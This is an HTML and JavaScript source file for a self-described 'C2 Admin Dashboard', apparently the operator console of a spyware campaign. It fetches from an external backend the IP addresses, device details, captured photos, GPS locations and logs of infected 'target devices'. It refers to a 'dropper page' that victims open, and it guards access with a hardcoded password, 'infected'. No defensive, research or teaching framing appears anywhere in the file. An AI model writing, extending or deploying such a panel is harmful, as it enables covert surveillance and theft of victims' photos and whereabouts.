<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C2 Dashboard</title>
    <style>
        /* ============================================================
           GLOBAL RESET & FONTS
           ============================================================ */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #0a0a12;
            color: #e0e0e0;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        /* ============================================================
           LOGIN SCREEN
           ============================================================ */
        .login-container {
            display: none;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            width: 100%;
            position: fixed;
            top: 0;
            left: 0;
            background: #0a0a12;
            z-index: 9999;
            padding: 20px;
        }

        .login-container.active {
            display: flex;
        }

        .login-card {
            background: linear-gradient(145deg, #14141f, #1e1e30);
            border-radius: 32px;
            padding: 48px 40px;
            max-width: 420px;
            width: 100%;
            border: 1px solid #2a2a44;
            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.8);
            text-align: center;
            animation: fadeUp 0.5s ease;
        }

        @keyframes fadeUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .login-card .lock-icon {
            font-size: 64px;
            display: block;
            margin-bottom: 12px;
        }

        .login-card h1 {
            font-size: 28px;
            font-weight: 700;
            background: linear-gradient(90deg, #f7971e, #ffd200);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 6px;
        }

        .login-card .sub {
            color: #8a8aaa;
            font-size: 14px;
            line-height: 1.6;
            margin-bottom: 28px;
        }

        .login-card input {
            width: 100%;
            padding: 16px 20px;
            border-radius: 60px;
            border: 1px solid #2a2a44;
            background: #0b0b14;
            color: #e0e0e0;
            font-size: 16px;
            text-align: center;
            letter-spacing: 3px;
            outline: none;
            transition: border-color 0.3s;
        }

        .login-card input:focus {
            border-color: #f7971e;
            box-shadow: 0 0 20px rgba(247, 151, 30, 0.1);
        }

        .login-card input::placeholder {
            color: #4a4a6a;
            letter-spacing: 1px;
        }

        .login-card .btn {
            background: linear-gradient(90deg, #f7971e, #ffd200);
            border: none;
            padding: 16px;
            border-radius: 60px;
            font-weight: 700;
            font-size: 17px;
            color: #0a0a12;
            width: 100%;
            cursor: pointer;
            margin-top: 16px;
            transition: transform 0.2s, box-shadow 0.2s;
            box-shadow: 0 8px 24px rgba(247, 151, 30, 0.25);
        }

        .login-card .btn:hover {
            transform: scale(1.02);
            box-shadow: 0 12px 32px rgba(247, 151, 30, 0.35);
        }

        .login-card .btn:active {
            transform: scale(0.96);
        }

        .login-card .error-msg {
            color: #ff5e5e;
            font-size: 13px;
            min-height: 24px;
            margin-top: 12px;
        }

        .login-card .footer-text {
            font-size: 11px;
            color: #4a4a6a;
            margin-top: 20px;
        }

        /* ============================================================
           DASHBOARD (hidden until logged in)
           ============================================================ */
        .dashboard-container {
            display: none;
            width: 100%;
            max-width: 1400px;
            margin: 0 auto;
            animation: fadeUp 0.5s ease;
        }

        .dashboard-container.active {
            display: block;
        }

        /* Header */
        .dashboard-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 16px;
            margin-bottom: 24px;
            padding-bottom: 16px;
            border-bottom: 1px solid #1a1a2e;
        }

        .dashboard-header h1 {
            font-size: 28px;
            background: linear-gradient(90deg, #f7971e, #ffd200);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .dashboard-header h1 span {
            font-size: 32px;
            -webkit-text-fill-color: initial;
            color: #ff3b3b;
        }

        .dashboard-header .header-actions {
            display: flex;
            align-items: center;
            gap: 14px;
            flex-wrap: wrap;
        }

        .dashboard-header .badge {
            background: #1a2a1a;
            color: #6fcf97;
            padding: 4px 16px;
            border-radius: 60px;
            font-size: 12px;
            border: 1px solid #2a4a2a;
        }

        .dashboard-header .logout-btn {
            background: #2a2a44;
            border: none;
            padding: 8px 20px;
            border-radius: 60px;
            color: #e0e0e0;
            font-weight: 600;
            font-size: 13px;
            cursor: pointer;
            transition: background 0.2s;
        }

        .dashboard-header .logout-btn:hover {
            background: #3a3a5a;
        }

        /* Controls */
        .controls {
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
            margin-bottom: 20px;
            align-items: center;
        }

        .controls .refresh-btn {
            background: #2a2a44;
            border: none;
            padding: 10px 24px;
            border-radius: 60px;
            color: #e0e0e0;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            transition: background 0.2s;
        }

        .controls .refresh-btn:hover {
            background: #3a3a5a;
        }

        .controls .info-text {
            color: #4a6a7a;
            font-size: 13px;
        }

        /* Stats Bar */
        .stats-bar {
            display: flex;
            gap: 24px;
            flex-wrap: wrap;
            background: #1a1a2e;
            padding: 14px 24px;
            border-radius: 60px;
            border: 1px solid #2a2a44;
            margin-bottom: 24px;
        }

        .stats-bar .stat {
            font-size: 14px;
            color: #aab;
        }

        .stats-bar .stat .num {
            color: #f7971e;
            font-weight: 700;
            font-size: 20px;
        }

        /* Device Grid */
        .device-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(360px, 1fr));
            gap: 20px;
        }

        /* Device Card */
        .device-card {
            background: linear-gradient(145deg, #14141f, #1e1e30);
            border-radius: 20px;
            padding: 20px;
            border: 1px solid #2a2a44;
            transition: border-color 0.3s, transform 0.2s;
        }

        .device-card:hover {
            border-color: #f7971e;
            transform: translateY(-2px);
        }

        .device-card .device-ip {
            color: #88ccff;
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 4px;
            font-family: 'Courier New', monospace;
        }

        .device-card .device-meta {
            font-size: 13px;
            color: #8a8aaa;
            line-height: 1.7;
            margin-bottom: 12px;
        }

        .device-card .device-meta .label {
            color: #4a6a7a;
        }

        .device-card .device-meta .highlight {
            color: #6fcf97;
        }

        /* Photo Grid inside card */
        .photo-grid {
            display: flex;
            gap: 6px;
            flex-wrap: wrap;
            margin-top: 8px;
        }

        .photo-grid img {
            width: 80px;
            height: 80px;
            object-fit: cover;
            border-radius: 10px;
            border: 1px solid #2a2a44;
            cursor: pointer;
            transition: transform 0.2s, border-color 0.2s;
        }

        .photo-grid img:hover {
            transform: scale(1.05);
            border-color: #f7971e;
        }

        .photo-grid .no-data {
            color: #4a6a7a;
            font-size: 12px;
            padding: 4px 0;
        }

        /* Log area */
        .log-area {
            background: #0b0b14;
            border-radius: 12px;
            padding: 8px 10px;
            max-height: 110px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 10px;
            line-height: 1.6;
            border: 1px solid #1a1a2a;
            margin-top: 6px;
        }

        .log-area .log-entry {
            border-bottom: 1px solid #0f0f1a;
            padding: 2px 0;
        }

        .log-area .log-entry .time {
            color: #4a6a7a;
            margin-right: 6px;
        }

        .log-area .log-entry .lvl-info { color: #88ccff; }
        .log-area .log-entry .lvl-warn { color: #ffaa44; }
        .log-area .log-entry .lvl-error { color: #ff5e5e; }
        .log-area .log-entry .lvl-success { color: #6fcf97; }

        /* Location list */
        .loc-list {
            font-size: 12px;
            color: #aab;
            margin-top: 4px;
        }

        .loc-list .loc-entry {
            padding: 2px 0;
            border-bottom: 1px solid #0f0f1a;
        }

        .loc-list .loc-entry .time {
            color: #4a6a7a;
            font-size: 10px;
        }

        /* Section titles inside card */
        .section-title {
            color: #88ccff;
            font-size: 12px;
            font-weight: 600;
            margin-top: 12px;
            margin-bottom: 4px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .section-title .count {
            background: #1a1a2e;
            padding: 0 10px;
            border-radius: 20px;
            font-size: 10px;
            color: #4a6a7a;
        }

        /* Error box */
        .error-box {
            background: #2a1a1a;
            border: 1px solid #ff5e5e;
            border-radius: 12px;
            padding: 16px;
            color: #ff5e5e;
            margin-bottom: 16px;
        }

        .loading {
            color: #88ccff;
            font-size: 16px;
            text-align: center;
            padding: 40px 0;
        }

        /* Scrollbar */
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-track { background: #0a0a12; }
        ::-webkit-scrollbar-thumb { background: #2a2a44; border-radius: 10px; }
        ::-webkit-scrollbar-thumb:hover { background: #3a3a5a; }

        /* Responsive */
        @media (max-width: 600px) {
            .login-card { padding: 32px 24px; }
            .device-grid { grid-template-columns: 1fr; }
            .stats-bar { gap: 12px; padding: 12px 16px; }
            .dashboard-header h1 { font-size: 22px; }
        }
    </style>
</head>
<body>

    <!-- ============================================================
    LOGIN SCREEN
    ============================================================ -->
    <div class="login-container active" id="loginContainer">
        <div class="login-card">
            <span class="lock-icon">🔒</span>
            <h1>Admin Access</h1>
            <p class="sub">Enter the password to view the C2 dashboard.</p>
            <input type="password" id="passwordInput" placeholder="Enter password" autofocus />
            <button class="btn" id="loginBtn">Unlock Dashboard</button>
            <div class="error-msg" id="loginError"></div>
            <p class="footer-text">🔐 This dashboard is password protected.</p>
        </div>
    </div>

    <!-- ============================================================
    DASHBOARD
    ============================================================ -->
    <div class="dashboard-container" id="dashboardContainer">
        <!-- Header -->
        <div class="dashboard-header">
            <h1><span>☠️</span> C2 Admin Dashboard</h1>
            <div class="header-actions">
                <span class="badge">🔐 Protected</span>
                <button class="logout-btn" id="logoutBtn">🚪 Logout</button>
            </div>
        </div>

        <!-- Controls -->
        <div class="controls">
            <button class="refresh-btn" id="refreshBtn">🔄 Refresh</button>
            <span class="info-text">Auto-refreshes every 15s</span>
        </div>

        <!-- Stats -->
        <div class="stats-bar" id="statsBar">
            <div class="stat">📱 Devices: <span class="num" id="statDevices">0</span></div>
            <div class="stat">📸 Photos: <span class="num" id="statPhotos">0</span></div>
            <div class="stat">📍 Locations: <span class="num" id="statLocations">0</span></div>
            <div class="stat">📋 Logs: <span class="num" id="statLogs">0</span></div>
        </div>

        <!-- Device Grid -->
        <div class="device-grid" id="deviceGrid">
            <div class="loading">⏳ Loading devices...</div>
        </div>
    </div>

    <script>
        // ============================================================
        //  CONFIG
        // ============================================================
        const PASSWORD = 'infected';
        const BACKEND = 'https://c2-vercel-backend.vercel.app';

        // ============================================================
        //  DOM REFS
        // ============================================================
        const loginContainer = document.getElementById('loginContainer');
        const dashboardContainer = document.getElementById('dashboardContainer');
        const passwordInput = document.getElementById('passwordInput');
        const loginBtn = document.getElementById('loginBtn');
        const loginError = document.getElementById('loginError');
        const logoutBtn = document.getElementById('logoutBtn');
        const refreshBtn = document.getElementById('refreshBtn');
        const deviceGrid = document.getElementById('deviceGrid');

        const statDevices = document.getElementById('statDevices');
        const statPhotos = document.getElementById('statPhotos');
        const statLocations = document.getElementById('statLocations');
        const statLogs = document.getElementById('statLogs');

        // ============================================================
        //  AUTH
        // ============================================================
        function checkAuth() {
            const auth = localStorage.getItem('dashboard_auth');
            if (auth === 'true') {
                loginContainer.classList.remove('active');
                dashboardContainer.classList.add('active');
                loadDevices();
                return true;
            }
            loginContainer.classList.add('active');
            dashboardContainer.classList.remove('active');
            return false;
        }

        function login() {
            const pass = passwordInput.value.trim();
            if (pass === PASSWORD) {
                localStorage.setItem('dashboard_auth', 'true');
                loginError.textContent = '';
                passwordInput.value = '';
                loginContainer.classList.remove('active');
                dashboardContainer.classList.add('active');
                loadDevices();
            } else {
                loginError.textContent = '❌ Incorrect password. Try again.';
                passwordInput.value = '';
                passwordInput.focus();
            }
        }

        function logout() {
            localStorage.removeItem('dashboard_auth');
            dashboardContainer.classList.remove('active');
            loginContainer.classList.add('active');
            passwordInput.value = '';
            loginError.textContent = '';
            passwordInput.focus();
        }

        // ============================================================
        //  API HELPERS
        // ============================================================
        async function fetchJSON(url) {
            try {
                const resp = await fetch(url);
                if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
                return await resp.json();
            } catch (e) {
                console.error('Fetch error:', e);
                return null;
            }
        }

        // ============================================================
        //  LOAD DEVICES + ALL DATA
        // ============================================================
        async function loadDevices() {
            deviceGrid.innerHTML = '<div class="loading">⏳ Loading devices...</div>';

            try {
                const devices = await fetchJSON(`${BACKEND}/api/devices`);
                if (!devices || devices.length === 0) {
                    deviceGrid.innerHTML = `
                        <div class="error-box" style="grid-column:1/-1;">
                            ⚠️ No devices registered yet.<br>
                            Open the dropper page on a target device.
                        </div>
                    `;
                    statDevices.textContent = '0';
                    statPhotos.textContent = '0';
                    statLocations.textContent = '0';
                    statLogs.textContent = '0';
                    return;
                }

                let totalPhotos = 0;
                let totalLogs = 0;
                let totalLocations = 0;

                deviceGrid.innerHTML = '';

                for (const d of devices) {
                    const [photos, logs, locations] = await Promise.all([
                        fetchJSON(`${BACKEND}/api/photos?deviceId=${encodeURIComponent(d.id)}`),
                        fetchJSON(`${BACKEND}/api/logs?deviceId=${encodeURIComponent(d.id)}`),
                        fetchJSON(`${BACKEND}/api/locations?deviceId=${encodeURIComponent(d.id)}`)
                    ]);

                    const pc = photos ? photos.length : 0;
                    const lc = logs ? logs.length : 0;
                    const locc = locations ? locations.length : 0;
                    totalPhotos += pc;
                    totalLogs += lc;
                    totalLocations += locc;

                    // --- PHOTOS ---
                    let photoHtml = '<div class="photo-grid">';
                    if (pc === 0) {
                        photoHtml += '<span class="no-data">No photos</span>';
                    } else {
                        photos.slice(0, 8).forEach(p => {
                            let url = '';
                            if (p.publicUrl) url = p.publicUrl;
                            else if (p.file_path) url = p.file_path;
                            else if (p.data_url && p.data_url.startsWith('data:')) url = p.data_url;
                            if (url) {
                                photoHtml += `<img src="${url}" alt="photo" onclick="window.open('${url}')" />`;
                            }
                        });
                        if (pc > 8) {
                            photoHtml += `<span style="color:#4a6a7a;font-size:11px;display:flex;align-items:center;">+${pc - 8} more</span>`;
                        }
                    }
                    photoHtml += '</div>';

                    // --- LOGS ---
                    let logHtml = '<div class="log-area">';
                    if (lc === 0) {
                        logHtml += '<span style="color:#4a6a7a;">No logs</span>';
                    } else {
                        logs.slice(0, 10).forEach(l => {
                            logHtml += `<div class="log-entry">
                                <span class="time">${new Date(l.timestamp).toLocaleTimeString()}</span>
                                <span class="lvl-${l.level || 'info'}">${l.message || ''}</span>
                            </div>`;
                        });
                        if (lc > 10) {
                            logHtml += `<div style="color:#4a6a7a;font-size:10px;">+${lc - 10} more</div>`;
                        }
                    }
                    logHtml += '</div>';

                    // --- LOCATIONS ---
                    let locHtml = '<div class="loc-list">';
                    if (locc === 0) {
                        locHtml += '<span style="color:#4a6a7a;font-size:11px;">No locations</span>';
                    } else {
                        locations.slice(0, 5).forEach(l => {
                            locHtml += `<div class="loc-entry">
                                📍 ${l.lat}, ${l.lon}
                                <span class="time">${new Date(l.timestamp).toLocaleTimeString()}</span>
                            </div>`;
                        });
                        if (locc > 5) {
                            locHtml += `<div style="color:#4a6a7a;font-size:10px;">+${locc - 5} more</div>`;
                        }
                    }
                    locHtml += '</div>';

                    // --- BUILD CARD ---
                    const card = document.createElement('div');
                    card.className = 'device-card';
                    card.innerHTML = `
                        <div class="device-ip">${d.ip || 'Unknown IP'}</div>
                        <div class="device-meta">
                            <div><span class="label">Device:</span> ${d.platform || 'Unknown'}</div>
                            <div><span class="label">Screen:</span> ${d.screen || 'Unknown'}</div>
                            <div><span class="label">Last seen:</span> <span class="highlight">${new Date(d.last_seen).toLocaleString()}</span></div>
                            <div style="margin-top:4px;">
                                <span class="label">📸 Photos:</span> ${pc} &nbsp;|&nbsp;
                                <span class="label">📋 Logs:</span> ${lc} &nbsp;|&nbsp;
                                <span class="label">📍 Locations:</span> ${locc}
                            </div>
                        </div>

                        <div class="section-title">📸 Photos <span class="count">${pc}</span></div>
                        ${photoHtml}

                        <div class="section-title">📋 Logs <span class="count">${lc}</span></div>
                        ${logHtml}

                        <div class="section-title">📍 Locations <span class="count">${locc}</span></div>
                        ${locHtml}
                    `;
                    deviceGrid.appendChild(card);
                }

                statDevices.textContent = devices.length;
                statPhotos.textContent = totalPhotos;
                statLogs.textContent = totalLogs;
                statLocations.textContent = totalLocations;

            } catch (err) {
                deviceGrid.innerHTML = `<div class="error-box" style="grid-column:1/-1;">❌ Error: ${err.message}</div>`;
                console.error(err);
            }
        }

        // ============================================================
        //  EVENT BINDINGS
        // ============================================================
        loginBtn.addEventListener('click', login);
        passwordInput.addEventListener('keydown', e => { if (e.key === 'Enter') login(); });
        logoutBtn.addEventListener('click', logout);
        refreshBtn.addEventListener('click', loadDevices);

        // ============================================================
        //  AUTO-REFRESH (only when dashboard is visible)
        // ============================================================
        setInterval(() => {
            if (dashboardContainer.classList.contains('active')) {
                loadDevices();
            }
        }, 15000);

        // ============================================================
        //  BOOT
        // ============================================================
        checkAuth();
        if (!dashboardContainer.classList.contains('active')) {
            passwordInput.focus();
        }

        console.log('☠️ C2 Dashboard loaded');
        console.log('🔐 Password: infected');
    </script>
</body>
</html>
